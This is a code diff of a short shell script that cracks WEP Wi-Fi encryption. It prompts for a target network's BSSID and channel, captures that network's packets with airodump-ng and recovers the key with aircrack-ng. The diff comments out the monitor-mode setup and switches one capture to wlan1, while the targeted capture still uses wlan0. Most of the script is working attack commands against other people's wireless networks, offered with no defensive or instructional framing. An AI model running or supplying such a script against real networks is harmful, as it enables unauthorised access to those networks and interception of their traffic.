@@ -10,10 +10,10 @@
 # WEP uses RC4 where packet is encrypted at the AP and decrypted at the client
 # Must capture packets with the initializing vector (IV) to get the key
 
-ifconfig wlan0 down
-iwconfig wlan0 mode monitor
+#ifconfig wlan0 down
+#iwconfig wlan0 mode monitor
 
-airodump-ng wlan0
+airodump-ng wlan1
 
 echo "What network do you want to target?"
 read host_mac
@@ -23,6 +23,6 @@ read ch
 
 airodump-ng --bssid $host_mac --channel $ch --write basic-test wlan0 && aircrack-ng basic-test-01.cap
 
-ifconfig wlan0 down
-iwconfig wlan0 mode managed
-ifconfig wlan0 up
+#ifconfig wlan0 down
+#iwconfig wlan0 mode managed
+#ifconfig wlan0 up
